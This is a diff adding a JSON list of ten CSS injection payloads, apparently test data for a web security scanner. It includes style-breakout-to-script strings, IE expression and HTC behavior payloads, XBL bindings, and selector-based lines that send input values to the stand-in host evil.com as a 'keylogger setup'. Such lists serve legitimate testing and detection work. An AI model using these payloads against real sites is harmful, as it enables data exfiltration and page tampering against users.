@@ -1,0 +1,62 @@
+[
+  {
+    "id": "css-001", "family": "css_injection", "subtype": "css_injection",
+    "payload_string": "</style><script>alert(1)</script>", "context": "string",
+    "description": "CSS Injection - Style breakout to XSS",
+    "references": ["https://owasp.org/www-community/attacks/Testing_for_CSS_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "css-002", "family": "css_injection", "subtype": "css_injection",
+    "payload_string": "body { background-image: url('http://evil.com/css_probe'); }", "context": "string",
+    "description": "CSS Injection - External image probe",
+    "references": ["https://owasp.org/www-community/attacks/Testing_for_CSS_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "css-003", "family": "css_injection", "subtype": "css_injection",
+    "payload_string": "x; background-image: url('http://evil.com/css_probe_attr');", "context": "string",
+    "description": "CSS Injection - Inline style attribute breakout",
+    "references": ["https://owasp.org/www-community/attacks/Testing_for_CSS_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "css-004", "family": "css_injection", "subtype": "css_injection",
+    "payload_string": "color:red; width:expression(alert(1));", "context": "string",
+    "description": "CSS Injection - IE expression payload",
+    "references": ["https://owasp.org/www-community/attacks/Testing_for_CSS_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "css-005", "family": "css_injection", "subtype": "css_injection",
+    "payload_string": "@import url('http://evil.com/malicious.css');", "context": "string",
+    "description": "CSS Injection - @import external sheet",
+    "references": ["https://owasp.org/www-community/attacks/Testing_for_CSS_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "css-006", "family": "css_injection", "subtype": "css_injection",
+    "payload_string": "input[value^=\"a\"] { background: url('http://evil.com/log?c=a'); }", "context": "string",
+    "description": "CSS Injection - Keylogger setup (starts with 'a')",
+    "references": ["https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b"], "platform_specific": {}
+  },
+  {
+    "id": "css-007", "family": "css_injection", "subtype": "css_injection",
+    "payload_string": "body::after { content: 'css_injected_content'; }", "context": "string",
+    "description": "CSS Injection - Content injection via pseudo-element",
+    "references": ["https://owasp.org/www-community/attacks/Testing_for_CSS_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "css-008", "family": "css_injection", "subtype": "css_injection",
+    "payload_string": "/* inject */ } body { display: none; } /*", "context": "string",
+    "description": "CSS Injection - Block breakout and hide body",
+    "references": ["https://owasp.org/www-community/attacks/Testing_for_CSS_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "css-009", "family": "css_injection", "subtype": "css_injection",
+    "payload_string": "-moz-binding: url('http://evil.com/xbl.xml#mybinding');", "context": "string",
+    "description": "CSS Injection - Mozilla XBL binding",
+    "references": ["https://owasp.org/www-community/attacks/Testing_for_CSS_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "css-010", "family": "css_injection", "subtype": "css_injection",
+    "payload_string": "behavior: url(http://evil.com/script.htc);", "context": "string",
+    "description": "CSS Injection - IE HTC behavior",
+    "references": ["https://owasp.org/www-community/attacks/Testing_for_CSS_Injection"], "platform_specific": {}
+  }
+]
